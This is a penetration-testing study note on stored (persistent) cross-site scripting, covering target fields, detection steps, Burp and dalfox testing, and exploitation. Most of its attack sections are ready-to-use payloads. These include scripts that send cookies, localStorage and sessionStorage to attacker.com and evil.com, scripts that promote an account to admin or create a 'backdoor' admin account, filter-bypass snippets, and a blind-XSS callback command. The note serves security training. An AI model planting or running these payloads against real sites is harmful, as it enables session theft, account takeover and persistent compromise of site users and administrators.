---
tags: [vapt, xss, intermediate]
difficulty: intermediate
module: "07 - XSS"
topic: "07.03 Stored XSS (Persistent XSS)"
portswigger_labs: "Cross-site scripting"
---

# 07.03 — Stored XSS (Persistent XSS)

## What is Stored XSS?

Stored XSS (also called Persistent XSS) occurs when the malicious payload is saved in the server's database (or other persistent storage) and then served to users who view that content. No tricking users into clicking a malicious link — any user who visits the infected page is automatically compromised.

```
FLOW:
  STEP 1 (Inject):
    Attacker submits comment/post with XSS payload:
    <script>document.location='https://evil.com/?c='+document.cookie</script>
    → Stored in database!
  
  STEP 2 (Trigger — automatic!):
    Any user views the page containing the stored XSS
    → HTML includes attacker's script
    → Every visitor's cookies sent to attacker!
  
  WHY MORE DANGEROUS:
    ✗ Reflected: attacker must trick victim into clicking link
    ✓ Stored:    attacker submits once → all visitors affected automatically
    
    If admin views the infected page → attacker gets ADMIN cookies!
    Admin cookie = full application access!
```

---

## High-Value Stored XSS Targets

```
WHERE STORED XSS IS MOST IMPACTFUL:

ADMIN PANEL VIEWERS (Critical):
  → Support ticket system (admin reads tickets)
  → User profile page (admin manages users)
  → Contact/feedback form (support reads submissions)
  → Error log viewer (admin reads logs)
  → Comment moderation queue (admin reviews)

MANY USERS (Wide Impact):
  → Product reviews/ratings
  → Public forum posts
  → Shared wiki/documentation pages
  → Chat/messaging features
  → Blog comments

AUTHENTICATION-RELATED:
  → Username field (shown at login, profile)
  → Bio field (shown on profile page)
  → File name (shown in shared file lists)
```

---

## Finding Stored XSS

```bash
# STEP 1: IDENTIFY ALL STORAGE INPUTS
# Any form that stores data:
# - Registration: username, email, bio
# - Profile editing: name, description, website
# - Content creation: posts, comments, reviews, tickets
# - File uploads: filename, description
# - Settings: display name, preferences

# STEP 2: SUBMIT CANARY VALUE
# Submit: <b>xsstest</b>
# Check if it appears rendered (bold) on the display page
# → HTML injection → test XSS next!

# STEP 3: TEST XSS PAYLOAD
# Submit: <script>alert(document.domain)</script>
# Navigate to where this data is displayed
# → Alert fires? → Stored XSS confirmed!

# STEP 4: IDENTIFY EXECUTION CONTEXT
# Right-click page → View Source
# Find your canary in the source
# Determine context (see contexts below)

# STEP 5: CHECK ALL DISPLAY LOCATIONS
# Stored data may appear in multiple places:
# - Main page (shown to all users)
# - Admin panel (shown to admins → higher impact!)
# - API endpoints (/api/users → returned as JSON)
# - Export features (CSV, PDF downloads)
```

---

## Common Stored XSS Targets

### Username Fields

```html
<!-- PAYLOAD IN USERNAME: -->
<script>alert(document.domain)</script>
<!-- OR (shorter): -->
<img src=x onerror=alert(1)>

<!-- WHERE IT FIRES:
  - Profile page: "Welcome, [USERNAME]"
  - Comment attribution: "Posted by [USERNAME]"
  - Admin user list: "User: [USERNAME]"
  → If admin views user list → admin XSS!
-->

<!-- BYPASS LENGTH LIMITS:
  If username max 20 chars → use short payload:
  <svg/onload=eval(atob('LONG_BASE64_PAYLOAD'))>
  Short trigger → executes longer payload!
-->
```

### Comment / Post Fields

```html
<!-- RICH TEXT EDITORS ARE COMMON VECTORS:
  TinyMCE, Quill, CKEditor may allow:
  → Paste XSS via browser dev tools (bypasses JS sanitization)
  → Style attribute with expression()
  → Script in uploaded SVG
  → SSTI in template-based rendering
-->

<!-- TEST THESE: -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<iframe src=javascript:alert(1)>
<body onload=alert(1)><!--
<script>/*</script><svg/onload=alert(1)>
```

### File Upload Names

```html
<!-- FILE NAME AS XSS:
  If filename is displayed: "Uploaded: [FILENAME]"
  Try filename: <img src=x onerror=alert(1)>.jpg
  → May render in HTML!
  
  OR: filename with XSS if path traversal:
  ../../var/www/html/shell.php (different vuln)
  
  ALSO: SVG upload → XSS via inline SVG content (see 07.12)
-->
```

---

## Stored XSS Exploitation

### Admin Cookie Theft

```javascript
// PoC payload (store in comment/username):
// Target: admin who reviews user submissions

<script>
// Steal all cookies + localStorage + sessionStorage:
var data = {
  cookies: document.cookie,
  origin: window.location.origin,
  ls: JSON.stringify(localStorage),
  ss: JSON.stringify(sessionStorage)
};
new Image().src = 'https://attacker.com/steal?' + 
  Object.entries(data).map(([k,v]) => k+'='+encodeURIComponent(v)).join('&');
</script>
```

### Account Takeover via API Calls

```javascript
// More powerful: make authenticated API requests AS the admin
<script>
fetch('/api/users/1/role', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': document.querySelector('[name=_csrf]')?.value || ''
  },
  body: JSON.stringify({role: 'admin', userId: 999})  // promote attacker's account
});
</script>
```

### Create New Admin Account

```javascript
<script>
// Get CSRF token first
fetch('/admin/users/create', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    username: 'backdoor',
    password: 'Backdoor123!',
    role: 'admin'
  })
}).then(r => new Image().src = 'https://attacker.com/done?s='+r.status);
</script>
```

---

## Multi-Stage Stored XSS

Some stored XSS requires multiple steps:

```
SCENARIO: Bio field shown on admin's "View Users" page

Step 1: Register with a long XSS payload in bio
Step 2: Admin logs in, navigates to Users management
Step 3: Admin page renders all users' bios → XSS fires in admin's browser!
Step 4: Admin's privileged session token → captured!

TIMING CONSIDERATION:
  Blind XSS (see 07.05):
  You can't see the admin page → use out-of-band callback
  Payload: <script>new Image().src='https://attacker.com/?'+document.cookie</script>
  Wait for the request to arrive at attacker.com
  Then use admin's cookies to access admin panel!
```

---

## Testing with Burp Suite

```
1. INTERCEPT: Capture POST request submitting to field
2. MODIFY: Replace field value with XSS payload
3. FORWARD: Submit to server
4. NAVIGATE: Browse to where data is displayed
5. CHECK: Does alert fire or do we see our payload in source?

BURP COLLAB FOR BLIND:
  Get collaborator URL from Burp Collaborator
  Payload: <script>new Image().src='https://BURP_COLLAB_URL/?c='+document.cookie</script>
  Check Collaborator interactions for callbacks!
```

---

## Automated Tools for Stored XSS

```bash
# BURP ACTIVE SCAN:
# In Target → right-click site → Active Scan → will find stored XSS

# DALFOX:
# For stored XSS, use --blind mode:
dalfox url "https://target.com/comment" \
  --data "comment=PAYLOAD&article_id=1" \
  --method POST \
  --blind "https://attacker.com/callback"

# CUSTOM SCRIPT — TEST ALL FORM FIELDS:
python3 -c "
import requests
# Submit to form:
r = requests.post('https://target.com/comment', 
    data={'comment': '<script>alert(1)</script>', 'id': 1})
# Then check display page:
r2 = requests.get('https://target.com/article/1')
if '<script>alert(1)</script>' in r2.text:
    print('Stored XSS found!')
elif '&lt;script&gt;' in r2.text:
    print('Encoded - not vulnerable in this context')
"
```

---

## Related Notes
- [[01 - What is XSS and Why It Matters]] — XSS fundamentals
- [[02 - Reflected XSS]] — reflected variant
- [[05 - Blind XSS]] — stored in admin-only areas
- [[16 - XSS to Session Hijacking]] — exploitation
- [[17 - XSS to Account Takeover]] — full account takeover
